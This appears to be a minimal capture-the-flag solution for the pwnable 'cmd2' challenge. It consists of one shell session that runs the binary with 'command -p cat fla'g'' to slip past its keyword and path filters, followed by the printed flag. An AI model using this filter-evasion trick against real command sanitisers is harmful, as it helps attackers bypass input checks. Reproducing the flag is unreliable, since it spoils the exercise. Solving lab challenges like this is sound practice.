# cmd2
```
cmd2@pwnable:~$ ./cmd2 "command -p cat fla'g'"
command -p cat fla'g'
FuN_w1th_5h3ll_v4riabl3s_haha
```